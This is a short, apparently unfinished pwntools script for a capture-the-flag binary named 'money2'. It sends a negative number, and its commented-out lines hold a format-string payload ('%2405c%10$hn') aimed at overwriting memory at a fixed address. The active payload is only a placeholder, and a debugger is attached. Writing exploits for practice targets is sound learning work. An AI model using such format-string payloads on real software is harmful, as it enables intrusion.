from pwn import *

p = process('./money2')
# p = remote('greed.sdc.tf', 1337)
elf = ELF('./money2')

p.sendline(b'-1001') # $ = 7 0x4006b0
# payload = b'%2405c%10$hn'
# payload = payload.ljust(16, b'a')
# payload += p64(0x601020)
payload = b'a'
gdb.attach(p)
p.sendline(payload)
p.interactive()
